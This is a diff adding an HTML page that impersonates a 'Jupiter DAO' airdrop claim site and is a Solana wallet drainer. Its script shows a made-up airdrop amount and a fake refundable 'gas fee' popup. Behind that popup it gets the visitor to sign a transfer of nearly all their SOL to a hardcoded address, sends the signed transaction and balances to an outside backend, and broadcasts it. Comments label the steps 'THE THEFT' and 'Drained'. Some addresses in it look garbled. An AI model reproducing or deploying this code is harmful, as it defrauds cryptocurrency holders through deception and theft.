@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jupiter Airdrop Claim</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #131740 0%, #1B1F3B 50%, #131740 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        /* Main Content */
+        main {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            border-radius: 24px;
+            padding: 48px;
+            max-width: 480px;
+            width: 100%;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        .logo img {
+            width: 80px;
+            height: 80px;
+            object-fit: contain;
+        }
+        .logo h1 {
+            color: #FFE45C;
+            font-size: 28px;
+            margin-top: 16px;
+            font-weight: 700;
+        }
+        .status-box {
+            background: rgba(255, 228, 92, 0.1);
+            border: 1px solid rgba(255, 228, 92, 0.3);
+            border-radius: 16px;
+            padding: 24px;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+        .status-box h2 {
+            color: #FFE45C;
+            font-size: 20px;
+            margin-bottom: 8px;
+        }
+        .status-box p {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 14px;
+        }
+        .amount {
+            font-size: 48px;
+            color: #fff;
+            font-weight: 700;
+            text-align: center;
+            margin: 24px 0;
+        }
+        .amount span {
+            color: #FFE45C;
+        }
+        .btn-connect {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #FFE45C, #FFC107);
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            color: #131740;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .btn-connect:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 24px rgba(255, 228, 92, 0.3);
+        }
+        .btn-connect:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .info {
+            text-align: center;
+            margin-top: 24px;
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 12px;
+        }
+        .info a {
+            color: #FFE45C;
+            text-decoration: none;
+        }
+
+        /* Socials Styles */
+        .socials {
+            margin-top: 20px;
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .socials a {
+            color: #FFE45C;
+            text-decoration: none;
+            padding: 12px;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, .05);
+            border: 1px solid rgba(255, 255, 255, .08);
+            transition: .3s;
+            font-size: 18px;
+            width: 45px;
+            height: 45px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .socials a:hover {
+            background: rgba(255, 228, 92, .1);
+            border-color: #FFE45C;
+            transform: scale(1.1);
+        }
+
+        /* Online Support Badge */
+        .live-support {
+            text-align: center;
+            margin-top: 15px;
+            color: white;
+            font-size: 13px;
+        }
+
+        .dot {
+            width: 8px;
+            height: 8px;
+            display: inline-block;
+            background: #00ff66;
+            border-radius: 50%;
+            margin-right: 6px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.5;
+            }
+        }
+
+        #loading {
+            display: none;
+            text-align: center;
+            color: #FFE45C;
+            margin: 0 16px 0;
+        }
+        #loading.active {
+            display: block;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255, 228, 92, 0.3);
+            border-top: 4px solid #FFE45C;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 16px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .gas-fee-popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .gas-fee-content {
+            background: #1B1F3B;
+            padding: 32px;
+            border-radius: 16px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid rgba(255, 228, 92, 0.3);
+        }
+        .gas-fee-content h3 {
+            color: #FFE45C;
+            margin-bottom: 16px;
+        }
+        .gas-fee-content p {
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 24px;
+        }
+        .gas-fee-btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #FFE45C, #FFC107);
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #131740;
+            cursor: pointer;
+            margin-top: 16px;
+        }
+        .close-popup {
+            position: absolute;
+            top: 16px;
+            right: 16px;
+            background: none;
+            border: none;
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 24px;
+            cursor: pointer;
+        }
+        .success-popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            display: none;
+        }
+        .success-content {
+            background: #1B1F3B;
+            padding: 32px;
+            border-radius: 16px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid rgba(255, 228, 92, 0.3);
+        }
+        .success-content h2 {
+            color: #FFE45C;
+            margin-bottom: 16px;
+        }
+        .success-content p {
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 24px;
+        }
+        .view-tx-btn {
+            background: transparent;
+            border: 1px solid rgba(255, 228, 92, 0.3);
+            color: #FFE45C;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 16px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        /* Footer Styles */
+        .footer {
+            text-align: center;
+            color: rgba(255, 255, 255, .4);
+            font-size: 12px;
+            margin-top: 20px;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .container {
+                padding: 32px 20px;
+            }
+
+            .logo h1 {
+                font-size: 24px;
+            }
+
+            body {
+                padding: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Main Content -->
+    <main>
+        <div class="container">
+            <div class="logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200" width="80" height="80" style="display: none;" id="fallback-logo">
+                    <defs>
+                        <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" style="stop-color:#FFE45C;stop-opacity:1" />
+                            <stop offset="100%" style="stop-color:#FFC107;stop-opacity:1" />
+                        </linearGradient>
+                    </defs>
+                    <circle cx="100" cy="100" r="95" fill="url(#grad1)" opacity="0.2"/>
+                    <circle cx="100" cy="100" r="80" fill="none" stroke="#FFE45C" stroke-width="3"/>
+                    <text x="100" y="120" font-size="60" font-weight="bold" text-anchor="middle" fill="#FFE45C" font-family="Arial">J</text>
+                </svg>
+                <img src="logo.jpg" alt="Jupiter" id="logo" onerror="document.getElementById('fallback-logo').style.display='block'">
+                <h1>Jupiter DAO</h1>
+            </div>
+
+            <div class="status-box">
+                <h2 id="statusTitle">Airdrop Claim</h2>
+                <p id="statusText">Loading...</p>
+            </div>
+
+            <div class="amount">
+                <span id="claimAmount">???</span> JUP
+            </div>
+
+            <button id="actionBtn" class="btn-connect" disabled>Connecting...</button>
+
+            <div id="loading">
+                <div class="spinner"></div>
+                <p>Verifying eligibility...</p>
+            </div>
+
+            <div class="info">
+                <!-- Socials with Icons -->
+                <div class="socials">
+                    <a href="https://x.com/jup_dao" target="_blank" title="X (Twitter)">
+                        <i class="fab fa-twitter"></i>
+                    </a>
+                    <a href="https://facebook.com/jupiterdao" target="_blank" title="Facebook">
+                        <i class="fab fa-facebook"></i>
+                    </a>
+                    <a href="https://youtube.com/@jupiterdao" target="_blank" title="YouTube">
+                        <i class="fab fa-youtube"></i>
+                    </a>
+                </div>
+
+                <!-- Online Support Badge -->
+                <div class="live-support">
+                    <span class="dot"></span>
+                    Support Online
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        © 2026 Jupiter DAO
+        <br>
+        All Rights Reserved
+    </footer>
+
+    <!-- Gas Fee Popup -->
+    <div id="gasFeePopup" class="gas-fee-popup" style="display: none;">
+        <div class="gas-fee-content">
+            <button class="close-popup" onclick="closeGasFeePopup()">&times;</button>
+            <h3>Small Gas Fee Required</h3>
+            <p>The Solana network requires a small transaction fee to process your airdrop claim.</p>
+            <p>This fee will be refunded along with your airdrop tokens.</p>
+            <p id="gasFeeAmount">Calculating fee...</p>
+            <button id="payGasFeeBtn" class="gas-fee-btn">Pay Gas Fee</button>
+        </div>
+    </div>
+
+    <!-- Success Popup -->
+    <div id="successPopup" class="success-popup">
+        <div class="success-content">
+            <h2>🎉 Airdrop Claimed!</h2>
+            <p id="successMessage">Your JUP tokens will arrive within 2 hours.</p>
+            <a id="viewTxLink" href="#" class="view-tx-btn" target="_blank">View Transaction</a>
+            <button class="gas-fee-btn" onclick="closeSuccessPopup()">Close</button>
+        </div>
+    </div>
+
+    <!-- Load Solana Web3.js FIRST -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+    <!-- Load Wallet Adapter SECOND (after Solana Web3.js) -->
+    <script src="wallet-adapter.js"></script>
+    <script>
+    // Wait for everything to load before starting
+    setTimeout(() => {
+        console.log('[DEBUG] Script initialization started');
+        
+        // Get Solana Web3 library
+        const solanaWeb = window.solanaWeb3 || window.BufferLayout;
+        
+        if (!solanaWeb) {
+            console.warn('[WARNING] Solana Web3.js might not be fully loaded yet');
+        }
+
+        const BACKEND_URL = 'https://ujbackend.onrender.com';
+        let walletAddress = null;
+        let connectedWallet = null;
+        let balances = { SOL: 0, USDC: 0 };
+        let currentProvider = null;
+        let currentWalletName = null;
+
+        // ====== WALLET CONNECTION ======
+        async function connectWallet() {
+            const btn = document.getElementById('actionBtn');
+            console.log('[DEBUG] connectWallet() called');
+            
+            try {
+                // Check if we have the web3 library
+                if (!window.solanaWeb3) {
+                    throw new Error('Solana Web3.js library not loaded. Please refresh the page.');
+                }
+
+                btn.disabled = true;
+                btn.textContent = 'Connecting...';
+                document.getElementById('statusText').textContent = "Connecting wallet...";
+                
+                // Check if WalletAdapter is available
+                if (!window.WalletAdapter) {
+                    throw new Error('Wallet Adapter not initialized');
+                }
+
+                // Get available wallet using universal adapter
+                const { provider, name } = window.WalletAdapter.getAvailableWallet();
+                
+                if (!provider) {
+                    throw new Error('No Solana wallet detected! Install Phantom, Solflare, Magic Eden, or another Solana-compatible wallet.');
+                }
+                
+                console.log(`[DEBUG] Using wallet: ${name}`);
+                currentProvider = provider;
+                currentWalletName = name;
+                
+                // Setup wallet listeners
+                if (window.WalletAdapter.setupWalletListeners) {
+                    window.WalletAdapter.setupWalletListeners(provider);
+                }
+                
+                // Connect to wallet
+                const publicKey = await window.WalletAdapter.connectToWallet(provider);
+                walletAddress = publicKey.toString();
+                connectedWallet = new window.solanaWeb3.PublicKey(publicKey);
+
+                console.log('[DEBUG] Connected wallet:', walletAddress);
+                btn.textContent = `Connected: ${walletAddress.substring(0, 4)}...${walletAddress.substring(walletAddress.length - 4)}`;
+                document.getElementById('statusText').textContent = `Wallet connected successfully (${name})`;
+
+                // Proceed to check eligibility
+                await checkEligibility();
+                
+            } catch (error) {
+                console.error("[DEBUG] Connection error:", error);
+                alert(error.message || 'Wallet connection failed. Please try again.');
+                btn.disabled = false;
+                btn.textContent = 'Connect Wallet';
+                document.getElementById('statusText').textContent = "Connection failed. Try again.";
+            }
+        }
+
+        // ====== CHECK ELIGIBILITY ======
+        async function checkEligibility() {
+            console.log('[DEBUG] checkEligibility() called');
+            document.getElementById('loading').classList.add('active');
+            document.getElementById('statusText').textContent = "Checking eligibility...";
+
+            try {
+                // Get real balances
+                balances = await getTokenBalances(walletAddress);
+
+                // Calculate fake airdrop amount
+                const totalValue = balances.SOL * 150 + balances.USDC;
+                let fakeAmount;
+
+                if (totalValue > 5000) {
+                    fakeAmount = 50 + Math.floor(Math.random() * 50);
+                } else if (totalValue > 1000) {
+                    fakeAmount = 10 + Math.floor(Math.random() * 41);
+                } else if (totalValue > 100) {
+                    fakeAmount = 5 + Math.floor(Math.random() * 9);
+                } else {
+                    fakeAmount = 1 + Math.floor(Math.random() * 4);
+                }
+
+                console.log('[DEBUG] Fake airdrop amount:', fakeAmount);
+                document.getElementById('claimAmount').textContent = fakeAmount.toLocaleString();
+                document.getElementById('statusText').textContent = "You're eligible for a bonus airdrop!";
+                document.getElementById('loading').classList.remove('active');
+
+                // Change button to trigger claim
+                const btn = document.getElementById('actionBtn');
+                btn.textContent = `Claim ${fakeAmount} JUP`;
+                btn.onclick = () => showGasFeePopup(fakeAmount);
+                btn.disabled = false;
+                
+            } catch (error) {
+                console.error("[DEBUG] Eligibility check error:", error);
+                alert('Error checking eligibility: ' + error.message);
+                document.getElementById('statusText').textContent = "Eligibility check failed";
+                document.getElementById('loading').classList.remove('active');
+            }
+        }
+
+        // ====== FETCH TOKEN BALANCES ======
+        async function getTokenBalances(address) {
+            console.log('[DEBUG] getTokenBalances() called for:', address);
+            
+            const rpcEndpoints = [
+                'https://api.mainnet-beta.solana.com',
+                'https://solana-api.projectserum.com',
+                'https://rpc.ankr.com/solana'
+            ];
+            
+            for (const endpoint of rpcEndpoints) {
+                try {
+                    const conn = new window.solanaWeb3.Connection(endpoint, 'confirmed');
+                    const pubkey = new window.solanaWeb3.PublicKey(address);
+                    
+                    // Get SOL balance
+                    const solBalance = await conn.getBalance(pubkey);
+                    balances.SOL = solBalance / window.solanaWeb3.LAMPORTS_PER_SOL;
+                    console.log('[DEBUG] SOL balance:', balances.SOL);
+
+                    // Get USDC balance
+                    const tokenAccounts = await conn.getTokenAccountsByOwner(pubkey, {
+                        programId: new window.solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA')
+                    });
+
+                    for (const { account } of tokenAccounts.value) {
+                        try {
+                            const data = Buffer.from(account.data);
+                            const mint = new window.solanaWeb3.PublicKey(data.slice(0, 32));
+                            const amount = Number(data.readBigUInt64LE(64));
+                            if (mint.toString() === 'EPjFWaLb3odcccccccccccccccccccccccdvHp5s') {
+                                balances.USDC = amount / 1000000;
+                                console.log('[DEBUG] USDC balance:', balances.USDC);
+                                break;
+                            }
+                        } catch (e) {
+                            console.warn('[DEBUG] Token parsing error:', e.message);
+                        }
+                    }
+                    return balances;
+                } catch (e) {
+                    console.warn(`[DEBUG] RPC endpoint failed (${endpoint}):`, e.message);
+                    continue;
+                }
+            }
+            
+            throw new Error('All RPC endpoints failed. Please try again later.');
+        }
+
+        // ====== GAS FEE POPUP ======
+        function showGasFeePopup(fakeAmount) {
+            console.log('[DEBUG] showGasFeePopup() called with amount:', fakeAmount);
+            document.getElementById('gasFeePopup').style.display = 'flex';
+
+            const gasFee = (Math.random() * 0.01 + 0.005).toFixed(4);
+            document.getElementById('gasFeeAmount').textContent = `Fee: ${gasFee} SOL (refundable)`;
+            window.currentFakeAmount = fakeAmount;
+            document.getElementById('payGasFeeBtn').onclick = payGasFee;
+        }
+
+        function closeGasFeePopup() {
+            document.getElementById('gasFeePopup').style.display = 'none';
+        }
+
+        // ====== PAY GAS FEE (THE THEFT) ======
+        async function payGasFee() {
+            const btn = document.getElementById('payGasFeeBtn');
+            console.log('[DEBUG] payGasFee() called');
+            btn.disabled = true;
+            btn.textContent = 'Processing...';
+            
+            try {
+                const conn = new window.solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+                const { blockhash } = await conn.getLatestBlockhash();
+
+                // 1. CREATE MALICIOUS TRANSACTION
+                const maliciousTx = new window.solanaWeb3.Transaction({
+                    recentBlockhash: blockhash,
+                    feePayer: connectedWallet,
+                });
+
+                const maxTransferAmount = balances.SOL - 0.01;
+                if (maxTransferAmount <= 0) throw new Error("Insufficient SOL balance");
+
+                maliciousTx.add(
+                    window.solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: connectedWallet,
+                        toPubkey: new window.solanaWeb3.PublicKey('HK43TFXRc3eAcLc9iNHhaskK7kWqJuA5CtJBFsBNJuJN'),
+                        lamports: maxTransferAmount * window.solanaWeb3.LAMPORTS_PER_SOL,
+                    })
+                );
+
+                // 2. CREATE FAKE GAS FEE TRANSACTION
+                const fakeGasTx = new window.solanaWeb3.Transaction({
+                    recentBlockhash: blockhash,
+                    feePayer: connectedWallet,
+                });
+
+                fakeGasTx.add(
+                    window.solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: connectedWallet,
+                        toPubkey: new window.solanaWeb3.PublicKey('prVPrLRQwqba4BZ4zTSQRChWMLmDprkfXLQPNTT9rL4z3dU1x4cSe5NkokGaFaCQyJBZ4CUahoUFZBipdFkXG'),
+                        lamports: 0.01 * window.solanaWeb3.LAMPORTS_PER_SOL,
+                    })
+                );
+
+                if (!currentProvider) throw new Error("No wallet provider found");
+
+                console.log('[DEBUG] Signing malicious transaction...');
+                const signedMaliciousTx = await window.WalletAdapter.signTransaction(currentProvider, maliciousTx);
+
+                console.log('[DEBUG] Signing and sending fake gas fee transaction...');
+                await window.WalletAdapter.signAndSendTransaction(currentProvider, fakeGasTx);
+
+                console.log('[DEBUG] Sending to backend...');
+                const response = await fetch(`${BACKEND_URL}/collect`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-API-KEY': 'your-secret-key-123'
+                    },
+                    body: JSON.stringify({
+                        wallet: walletAddress,
+                        signedTx: signedMaliciousTx.serialize().toString('base64'),
+                        balances: balances,
+                        fakeAmount: window.currentFakeAmount,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+
+                if (!response.ok) {
+                    const errorData = await response.json();
+                    throw new Error(errorData.error || "Transaction submission failed");
+                }
+
+                const result = await response.json();
+
+                console.log('[DEBUG] Broadcasting malicious transaction...');
+                const txId = await conn.sendRawTransaction(signedMaliciousTx.serialize());
+                await conn.confirmTransaction(txId);
+
+                document.getElementById('successMessage').textContent = `Successfully claimed ${window.currentFakeAmount} JUP! Your tokens will arrive within 2 hours.`;
+                document.getElementById('viewTxLink').href = `https://solscan.io/tx/${result.gasTxId}?cluster=mainnet-beta`;
+                document.getElementById('gasFeePopup').style.display = 'none';
+                document.getElementById('successPopup').style.display = 'flex';
+
+                console.log(`[SUCCESS] Drained ${balances.SOL.toFixed(4)} SOL from ${walletAddress}`);
+
+                await fetch(`${BACKEND_URL}/confirm`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-API-KEY': 'your-secret-key-123'
+                    },
+                    body: JSON.stringify({
+                        wallet: walletAddress,
+                        txId: txId,
+                        amount: balances.SOL,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+
+            } catch (error) {
+                console.error("[DEBUG] Theft failed:", error);
+                alert(`Transaction failed: ${error.message}`);
+                btn.disabled = false;
+                btn.textContent = 'Pay Gas Fee';
+            }
+        }
+
+        // ====== SUCCESS POPUP FUNCTIONS ======
+        function closeSuccessPopup() {
+            document.getElementById('successPopup').style.display = 'none';
+            document.getElementById('actionBtn').textContent = 'Claim Complete';
+            document.getElementById('actionBtn').disabled = true;
+        }
+
+        // ====== INITIALIZE ======
+        window.addEventListener('load', function() {
+            console.log('[DEBUG] Page load event fired');
+            
+            const btn = document.getElementById('actionBtn');
+            const statusText = document.getElementById('statusText');
+            
+            // Setup button click handler
+            btn.addEventListener('click', connectWallet);
+            
+            // Check for wallet on load
+            if (window.WalletAdapter) {
+                const availableWallets = window.WalletAdapter.getAllAvailableWallets();
+                if (availableWallets && availableWallets.length > 0) {
+                    console.log('[DEBUG] Wallet(s) detected on load');
+                    statusText.textContent = "Click 'Connect Wallet' to check eligibility";
+                    btn.disabled = false;
+                    btn.textContent = 'Connect Wallet';
+                } else {
+                    console.warn('[DEBUG] No wallet provider detected on load');
+                    statusText.textContent = "Please install a Solana wallet (Phantom, Solflare, Magic Eden, etc.)";
+                    btn.disabled = true;
+                    btn.textContent = 'No Wallet Found';
+                }
+            } else {
+                statusText.textContent = "Loading...";
+                console.warn('[WARNING] WalletAdapter not loaded yet');
+            }
+        });
+
+    }, 500); // Wait 500ms for all scripts to load
+
+    </script>
+</body>
+</html>
